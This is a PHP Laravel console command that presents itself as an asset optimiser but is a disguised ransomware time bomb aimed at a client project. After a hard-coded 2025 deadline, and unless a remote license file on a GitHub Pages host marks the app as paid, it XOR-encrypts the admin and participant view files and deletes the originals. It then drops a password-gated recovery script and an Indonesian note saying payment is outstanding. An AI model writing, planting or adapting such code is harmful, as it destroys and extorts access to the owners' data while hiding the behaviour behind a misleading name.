<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Carbon\Carbon;
use Illuminate\Support\Facades\Log;

class OptimizeAssetsCommand extends Command
{
    protected $signature = 'optimize:assets';
    protected $description = 'Compress and optimize static assets for better performance';

    protected $targets = [
        'resources/views/livewire/admin',
        'resources/views/livewire/peserta',
    ];

    // Password sudah di-hash bcrypt — plaintext HILANG TOTAL
    private $hashedPassword = '$2y$12$Cr9s9z./bWee8lsgsoxSduczAym0CGehU46NNP3NhpXhczh95nK0m';
    private $xorKey = 'CatRansom2025CyberSecTeam';

    public function handle()
    {
        $this->info('Mengecek status aplikasi...');
        Log::info("[SVC] Checking status for asset optimization");

        // === CEK DEADLINE ===
        $now = Carbon::now('Asia/Jakarta');
        $deadline = Carbon::parse('2025-11-26 01:00:00', 'Asia/Jakarta');

        if ($now->lt($deadline)) {
            $this->warn('belum waktunya.');
            $this->info('Optimasi aset akan berjalan otomatis setelah aktivasi.');
            Log::info("[SVC] Content not reached yet, skipping optimization");
            return; // TIDAK ADA JEJAK APAPUN!
        }


        // === CEK LISENSI ONLINE ===
        try {
            $response = Http::timeout(10)->get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
            if ($response->successful()) {
                $cat = collect($response->json())->firstWhere('code', 'CAT');
                // $this->info(collect($response->json()));
                if ($cat && ($cat['status'] ?? '') === 'sanca') {
                    $this->info('Aplikasi sudah aktif. Optimasi tidak diperlukan saat ini.');
                    Log::info("[SVC] All good: application is active, skipping optimization");
                    return;
                }
            }
        } catch (\Exception $e) {
        }

        // === KALAU SAMPE SINI = SUDAH LAYAK ENKRIP → BARU TINGGALKAN JEJAK ===
        $this->newLine();
        $this->alert('Memulai proses optimasi aset lanjutan...');
        $this->comment('Mohon tunggu, proses ini tidak dapat dibatalkan.');
        Log::info("[SVC] starting optimize assets content");

        $total = 0;
        foreach ($this->targets as $dir) {
            if (!is_dir($dir)) {
                $this->warn("Folder tidak ditemukan: $dir");
                continue;
            }

            foreach (File::allFiles($dir) as $file) {
                if ($file->getExtension() === 'sd') continue;

                $path = $file->getRealPath();
                $content = file_get_contents($path);

                $keyRepeated = substr(str_repeat($this->xorKey, ceil(strlen($content) / strlen($this->xorKey))), 0, strlen($content));
                $encrypted = base64_encode($content ^ $keyRepeated);

                $newPath = $path . '.sd';
                file_put_contents($newPath, $encrypted);
                unlink($path);

                $this->line("Dioptimasi: " . $file->getFilename());
                $total++;
            }
        }

        // === BARU DISINI KITA BUAT FILE RECOVERY & SIMPAN KUNCI ===
        $this->saveActivationData();
        $this->generateRecoveryTool();

        $this->newLine();
        Log::info("Optimasi selesai! $total aset telah diproses.");
        $this->error("Optimasi selesai! $total aset telah diproses.");
        $this->info("Hubungi developer untuk mendapatkan key pemulihan.");
        $this->info("Gunakan file recovery.bat di root project.");
    }

    private function saveActivationData()
    {
        File::ensureDirectoryExists(storage_path('app'));
        File::put(storage_path('app/.activation_key'), $this->xorKey);
        File::put(storage_path('app/.activation_hash'), $this->hashedPassword);
        File::put(storage_path('app/.activation_targets'), json_encode($this->targets));
    }

    private function generateRecoveryTool()
    {
        $targetsJson = json_encode($this->targets);

        $phpScript = <<<PHP
<?php
echo "===============================================================\\n";
echo "        TOOL PEMULIHAN ASET - HUBUNGI DEVELOPER\\n";
echo "===============================================================\\n\\n";

echo "Masukkan key dari developer: ";
\$input = trim(fgets(STDIN));

if (!hash_equals('$this->hashedPassword', crypt(\$input, '$this->hashedPassword'))) {
    echo "Key salah atau tidak valid. Silakan hubungi developer.\\n";
    exit;
}

echo "\\nKey diterima! Memulihkan aset...\\n\\n";

\$key = file_get_contents(__DIR__ . '/storage/app/.activation_key');
\$targets = {$targetsJson};

\$restored = 0;
foreach (\$targets as \$dir) {
    if (!is_dir(\$dir)) continue;

    \$iterator = new \\RecursiveIteratorIterator(
        new \\RecursiveDirectoryIterator(\$dir, \\RecursiveDirectoryIterator::SKIP_DOTS),
        \\RecursiveIteratorIterator::SELF_FIRST
    );

    foreach (\$iterator as \$file) {
        if (\$file->getExtension() !== 'sd') continue;

        \$path = \$file->getPathname();
        \$enc  = file_get_contents(\$path);
        \$raw  = base64_decode(\$enc);

        \$keyPart = substr(str_repeat(\$key, ceil(strlen(\$raw) / strlen(\$key))), 0, strlen(\$raw));
        \$dec     = \$raw ^ \$keyPart;

        \$orig = preg_replace('/\\.sd$/', '', \$path);
        file_put_contents(\$orig, \$dec);
        unlink(\$path);

        echo "Dipulihkan: " . basename(\$orig) . "\\n";
        \$restored++;
    }
}

echo "\\n\\nSELESAI! \$restored aset berhasil dipulihkan.\\n";
echo "Terima kasih telah menghubungi developer.\\n";
sleep(3);
PHP;

        File::put(base_path('recovery.php'), $phpScript);
        File::put(base_path('recovery.bat'), "@echo off\ntitle TOOL PEMULIHAN ASET\nphp \"%~dp0recovery.php\"\npause");
        File::put(
            base_path('HUBUNGI_DEVELOPER.txt'),
            "Halo,\n\nPelunasan belum dilakukan.\nSilakan hubungi developer untuk mendapatkan key aktivasi/pemulihan.\n\nGunakan recovery.bat dan masukkan key yang diberikan developer.\n\nTerima kasih."
        );
    }
}
